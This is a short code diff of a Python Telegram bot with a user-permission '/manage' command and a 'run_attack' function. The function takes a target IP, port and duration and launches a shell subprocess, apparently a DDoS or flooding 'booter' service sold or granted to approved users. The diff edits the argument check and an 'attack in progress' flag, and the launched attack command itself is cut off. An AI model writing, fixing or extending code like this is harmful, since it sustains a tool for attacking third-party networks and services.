@@ -38,7 +38,7 @@ async def manage(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @LOLOLOLOLOLOL89*", parse_mode='Markdown')
         return
 
-    if len(args) != 30:
+    if len(args) != 2:
         await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /manage add 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /manage rem 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
         return
 
@@ -56,7 +56,7 @@ async def manage(update: Update, context: CallbackContext):
 
 async def run_attack(chat_id, ip, port, time, context):
     global attack_in_progress
-    attack_in_progress = True
+    attack_in_progress = False
 
     try:
         process = await asyncio.create_subprocess_shell(
